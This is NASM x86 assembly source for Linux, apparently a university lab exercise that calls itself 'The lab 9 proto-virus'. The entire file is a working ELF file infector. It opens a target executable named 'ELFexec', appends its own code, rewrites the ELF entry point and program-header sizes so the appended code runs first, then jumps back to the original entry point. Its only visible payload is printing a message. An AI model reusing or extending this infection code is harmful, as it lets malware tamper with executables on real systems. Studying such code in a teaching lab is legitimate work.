%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%macro checkMagic 1
        cmp byte [%1 + 1], 'E'
        jne exit1
        cmp byte [%1 + 2], 'L'
        jne exit1
        cmp byte [%1 + 3], 'F'
        jne exit1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8



	global _start
	section .text
_start:	
        push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	
	;print msg
	call get_my_loc
        sub esi, (anchor - OutStr)
        write 1, esi, 32
        
        ;open file
        call get_my_loc
        sub esi, (anchor - FileName)
        open esi, 2, 777
        cmp eax, 0
        jge cont
        
        ;file open error
        call get_my_loc
        sub esi, (anchor - Failstr)
        write 1, esi, 13
        jmp exit1

cont:
        ;save fd
        mov edi, eax
        ;get start of buffer
        lea esi, [ebp - STK_RES]
        ;read header to buffer
        read edi, esi, 52
        checkMagic esi
        
        ;this is an ELF file
        ;go to end of file
        lseek edi, 0, SEEK_END
        mov [ebp - 12], eax
        ;push eax ;size of file
        
        ;get loc of _start
        call get_my_loc
        sub esi, (anchor - _start)
        mov eax, esi
        
        ;get loc of virus_end
        call get_my_loc
        sub esi, (anchor - virus_end)
        
        ;write virus code to fd
        sub esi, eax
        mov [ebp - 8] , esi ; end-start
        write edi, eax, esi
        
        ;change entry point
        lea esi, [ebp - STK_RES + 24]
        mov esi, [esi]
        
        mov [ebp - 4], esi ; save entry point
        lea esi, [ebp - STK_RES + 28] ; offest
        lseek edi, [esi], SEEK_SET
        lea ecx,[ebp - STK_RES + 52]
        read edi, ecx, (PHDR_size * 2)
        lea esi, [ebp - STK_RES + 84 + PHDR_vaddr]
        mov ecx, [ebp -12] ;size of file
        add ecx, [esi]
        lea esi, [ebp - STK_RES + 84 + PHDR_offset]
        sub ecx, [esi]
        ;save change to entry point
        mov dword [ebp - STK_RES + 24], ecx

        
        mov esi, virus_end - _start
        add esi, [ebp - 12]
        lea eax, [ebp - STK_RES + 84 + PHDR_offset]
        sub esi, [eax]
        lea eax, [ebp - STK_RES + 84 + PHDR_filesize]
        mov [eax], esi
        
        lea eax, [ebp - STK_RES + 84 + PHDR_memsize]
        mov [eax], esi
        
        ;save changes to file
        lseek edi, 0, SEEK_SET
        lea ecx, [ebp - STK_RES] 
        write edi, ecx, 116
        
        lseek edi, -4, SEEK_END
        lea eax, [ebp-4]
        write edi, eax, 4
        
        close edi

        
exit1:
        call get_my_loc
        sub esi, (anchor - PreviousEntryPoint)
        jmp dword [esi]
        
VirusExit:
    exit 0            ; Termination if all is OK and no previous code                to jump to
                         ; (also an example for use of above macros)

        get_my_loc:
        call	anchor
        anchor:
        pop	esi
        ret
                         
                
	FileName:	db "ELFexec", 0
        OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
        Failstr:        db "perhaps not", 10 , 0
	
PreviousEntryPoint: dd VirusExit
virus_end:


